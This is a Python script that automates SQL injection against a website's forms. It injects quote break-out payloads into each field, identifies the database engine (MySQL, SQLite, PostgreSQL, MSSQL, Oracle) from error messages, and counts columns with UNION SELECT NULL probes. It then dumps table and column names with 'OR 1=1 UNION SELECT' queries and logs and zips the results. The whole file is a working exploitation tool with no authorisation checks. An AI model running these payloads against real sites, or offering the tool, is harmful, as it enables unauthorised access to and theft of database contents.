from requests_html import HTMLSession
import argparse
import requests
from utils import get_all_forms, get_form_details, diff_html
import zipfile
import os

parser = argparse.ArgumentParser(description="Perform sqli detection on a website")
parser.add_argument("url", help="URL of the website to scan")
parser.add_argument(
    "-X", type=str, default="GET", metavar="METHOD", help="Enter the method"
)
parser.add_argument(
    "-o",
    type=str,
    default="logs",
    metavar="FILE",
    help="Enter the output of archive file",
)

args = parser.parse_args()
entrypoints = ["'", '"', "`", "')", '")', "`)", "'))", '"))', "`))"]

tables = {
    "sqlite": "FROM sqlite_master",
    "mysql": "FROM information_schema.columns",
    "postgresql": "FROM information_schema.tables",
    "mssql": "FROM information_schema.tables",
    "oracle": "FROM all_tables",
}
infos = {
    "sqlite": ["name", "sql"],  # sql for colums, name for tables
    "mysql": ["table_name", "column_name"],
    "postgresql": ["table_name", "column_name"],
    "mssql": ["table_name", "column_name"],
    "oracle": ["table_name", "column_name"],
}
comments = {
    "sqlite": "--",
    "mysql": "#",
    "postgresql": "--",
    "mssql": "--",
    "oracle": "--",
}


def make_request(injectable_input, form_details, payload, method):
    data = {}
    data[injectable_input] = payload
    for input_tag in form_details["inputs"]:
        if input_tag["type"] != "submit" and input_tag["name"] != injectable_input:
            data[input_tag["name"]] = "eXaMpl34Tst"
    data[form_details["inputs"][-1]["name"]] = form_details["inputs"][-1]["value"]
    if method == "POST":
        return requests.post(form_details["action"], data=data)
    return requests.get(form_details["action"], params=data)


def detect_error(diff):
    errors = {
        "mysql": [
            "You have an error in your SQL syntax",
            "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in",
            "Uncaught mysqli_sql_exception",
        ],
        "sqlite": ["SQLite3::query(): Unable to prepare statement"],
        "postgresql": ["PostgreSQL query failed: ERROR: syntax error at or near"],
        "mssql": [
            "Microsoft OLE DB Provider for SQL Server",
            "Unclosed quotation mark after the character string",
        ],
        "oracle": ["Oracle Database Error"],
    }
    if diff == None:
        return "Unknown"
    for elt in diff:
        for engine, error_messages in errors.items():
            for error_message in error_messages:
                if elt.find(error_message) != -1:
                    return engine
    return "Unknown"


def detect_database_engine(form_details, method):
    page = requests.get(args.url)
    working = []
    for payload in entrypoints:
        for input_tag in form_details["inputs"]:
            if input_tag["type"] != "submit":
                res = make_request(input_tag["name"], form_details, payload, method)
                diff = diff_html(
                    page.text.splitlines(keepends=True),
                    res.text.splitlines(keepends=True),
                )
                engine = detect_error(diff)
            if engine != "Unknown" and input_tag["name"] != None:
                working.append(
                    {
                        "engine": engine,
                        "payload": payload,
                        "input": input_tag["name"],
                    }
                )
    return working


def detect_number_of_columns(input, form_details, working, engine, method):
    columns = "NULL"
    nb_colums = 1
    while nb_colums > 0 and nb_colums < 20:
        res = make_request(
            input,
            form_details,
            f"{working} UNION SELECT {columns} {comments[engine]}",
            method,
        )
        diff = diff_html(
            page.text.splitlines(keepends=True), res.text.splitlines(keepends=True)
        )
        error = detect_error(diff)
        if error == "Unknown":
            return nb_colums
        columns += ",NULL"
        nb_colums += 1
    return 0


def dump_database(input, working, form_details, nb_columns, engine, insert):
    count = 1
    while count < nb_columns:
        insert += ",NULL"
        count += 1
    payload = (
        f"{working} OR 1=1 UNION SELECT {insert} {tables[engine]} {comments[engine]}"
    )
    log.write(f"PAYLOAD USED: {payload}\n")
    res = make_request(input, form_details, payload, args.X)
    diff = diff_html(
        page.text.splitlines(keepends=True), res.text.splitlines(keepends=True)
    )
    return diff


if __name__ == "__main__":
    try:
        log = open(args.o, "w")
        session = HTMLSession()
        page = session.get(args.url)
        forms = get_all_forms(args.url)
        for form in forms:
            form_details = get_form_details(form)
            if form_details["action"].startswith("http"):
                form_details["action"] = form_details["action"]
            else:
                form_details["action"] = args.url + form_details["action"]
            if form_details["method"].lower() != args.X.lower():
                continue
            results = detect_database_engine(form_details, args.X)
            if results == []:
                log.write("No SQL injection found")
                exit(0)
            for payload in results:
                columns = detect_number_of_columns(
                    payload["input"],
                    form_details,
                    payload["payload"],
                    payload["engine"],
                    args.X,
                )
                log.write(f"VULNERABLE PARAMETER: {payload['input']}\n")
                log.write(f"ENGINE: {payload['engine']}\n")
                log.write(
                    f"TABLE NAMES: {dump_database(payload['input'], payload['payload'], form_details, columns, payload['engine'], infos[payload['engine']][0])}\n"
                )
                log.write(
                    f"COLUMNS NAMES: {dump_database(payload['input'], payload['payload'], form_details, columns, payload['engine'], infos[payload['engine']][1])}\n"
                )
                log.write("-" * 100 + "\n")
        log.close()
        with zipfile.ZipFile(args.o + ".zip", "w") as zipf:
            zipf.write(args.o)
        os.remove(args.o)
    except Exception as e:
        print(f"An error occured: {e}")
        exit(1)
